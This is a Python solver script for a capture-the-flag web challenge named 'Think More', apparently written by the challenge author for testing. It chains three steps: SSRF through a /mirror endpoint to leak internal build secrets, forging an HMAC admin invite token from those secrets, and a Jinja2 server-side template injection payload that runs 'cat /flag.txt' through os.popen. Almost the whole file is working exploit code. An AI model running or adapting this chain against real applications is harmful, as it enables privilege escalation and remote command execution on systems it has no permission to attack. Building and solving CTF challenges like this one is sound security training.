#!/usr/bin/env python3
"""
Think More — CTF Solver (Author Testing Only)
Chain: SSRF → Token Forge → SSTI (Jinja2 RCE) → Flag

Usage:
    python solve.py --target http://localhost:2415
"""

import argparse
import hashlib
import hmac
import json
import base64
import re
import sys
import time
import urllib.parse

import requests


def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def canonical_json(payload: dict) -> str:
    return json.dumps(dict(sorted(payload.items())), separators=(",", ":"))


def derive_secret(invite_key_part: str, team_slug: str, release: str, instance_seed: str) -> bytes:
    raw = f"{invite_key_part}:{team_slug}:{release}:{instance_seed}"
    return hashlib.sha256(raw.encode()).digest()


def build_invite_token(email: str, secret: bytes, team_slug: str) -> str:
    payload = {
        "email": email,
        "exp": int(time.time()) + 3600,
        "role": "admin",
        "scope": "backoffice",
        "team": team_slug,
    }
    canonical = canonical_json(payload)
    encoded = base64url_encode(canonical.encode())
    signature = hmac.new(secret, canonical.encode(), hashlib.sha256).hexdigest()
    return f"{encoded}.{signature}"


def solve(target: str):
    s = requests.Session()
    target = target.rstrip("/")

    # ── Step 0: Register + Login ─────────────────────────────────────────
    email = f"solver-{int(time.time())}@test.local"
    password = "SolverPass123!"
    username = "solver"

    print(f"[*] Registering {email}")
    r = s.post(f"{target}/register", data={
        "email": email,
        "username": username,
        "password": password,
    }, allow_redirects=False)
    # Follow redirect manually to keep session
    s.get(f"{target}/dashboard")
    print(f"[+] Registered and logged in")

    # ── Step 1: SSRF via /mirror → cache-proxy → /internal/build-info ──
    print("[*] Step 1: SSRF to leak build-info via cache-proxy alias (root path)")
    r = s.post(f"{target}/mirror", data={
        "name": "SSRF-Probe",
        "logo_url": "http://cache-proxy:5000/",
    }, allow_redirects=True)

    # Find the vendor ID from redirect
    vendor_match = re.search(r'/previews/(\d+)', r.url)
    if not vendor_match:
        print("[-] Failed to create vendor")
        sys.exit(1)

    vendor_id = vendor_match.group(1)
    print(f"[+] Created vendor #{vendor_id}")

    # Fetch the cached preview
    r = s.get(f"{target}/previews/{vendor_id}")
    body = r.text

    # Parse build-info from preview
    team_slug = re.search(r'TEAM_SLUG=(\S+)', body)
    invite_key_part = re.search(r'INVITE_KEY_PART=(\S+)', body)
    instance_seed = re.search(r'INSTANCE_SEED=(\S+)', body)

    if not all([team_slug, invite_key_part, instance_seed]):
        print("[-] Failed to extract build-info from SSRF response")
        print(f"    Body preview: {body[:500]}")
        sys.exit(1)

    team_slug = team_slug.group(1)
    invite_key_part = invite_key_part.group(1)
    instance_seed = instance_seed.group(1)

    # Get release from X-Release header
    r = s.get(f"{target}/dashboard")
    release = r.headers.get("X-Release", "")

    print(f"[+] Leaked:")
    print(f"    TEAM_SLUG       = {team_slug}")
    print(f"    INVITE_KEY_PART = {invite_key_part}")
    print(f"    INSTANCE_SEED   = {instance_seed}")
    print(f"    X-Release       = {release}")

    # Also get the source map hint
    debug_asset = re.search(r'DEBUG_ASSET=(\S+)', body)
    if debug_asset:
        print(f"    DEBUG_ASSET     = {debug_asset.group(1)}")

    # ── Step 2: Forge admin invite token ─────────────────────────────────
    print("[*] Step 2: Forging admin invite token")
    secret = derive_secret(invite_key_part, team_slug, release, instance_seed)
    token = build_invite_token(email, secret, team_slug)
    print(f"[+] Token: {token[:40]}...")

    r = s.post(f"{target}/invite/accept", data={"token": token}, allow_redirects=True)

    # Verify admin access
    r = s.get(f"{target}/admin")
    if r.status_code != 200 or "Billing Template" not in r.text:
        print("[-] Failed to get admin access")
        sys.exit(1)
    print("[+] Admin access granted!")

    # ── Step 3: SSTI via Jinja2 billing template ─────────────────────────
    print("[*] Step 3: SSTI via Jinja2 render_template_string")

    # Save SSTI payload as billing template (bypass client-side guard)
    ssti_payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}"
    print(f"[*] Payload: {ssti_payload}")

    r = s.post(f"{target}/admin/billing/template", data={
        "billing_template": ssti_payload,
    }, allow_redirects=True)
    print("[+] Template saved (client-side guard bypassed via direct POST)")

    # Trigger preview render
    r = s.post(f"{target}/admin/billing/preview", data={}, allow_redirects=True)

    # Extract flag from rendered preview
    flag_match = re.search(r'(LYKNCTF\{[^}]+\})', r.text)
    if not flag_match:
        # Try other flag formats
        flag_match = re.search(r'(RRCTF\{[^}]+\})', r.text)
    if not flag_match:
        flag_match = re.search(r'(CTF\{[^}]+\})', r.text)
    if not flag_match:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)

    if flag_match:
        flag = flag_match.group(1)
        print(f"\n[FLAG] {flag}\n")
    else:
        print("[-] Could not extract flag from response")
        # Show rendered preview for debugging
        preview_match = re.search(r'<pre class="code"[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        if preview_match:
            print(f"    Preview output: {preview_match.group(1)[:200]}")
        sys.exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Think More CTF Solver")
    parser.add_argument("--target", default="http://localhost:2415", help="Target URL")
    args = parser.parse_args()
    solve(args.target)
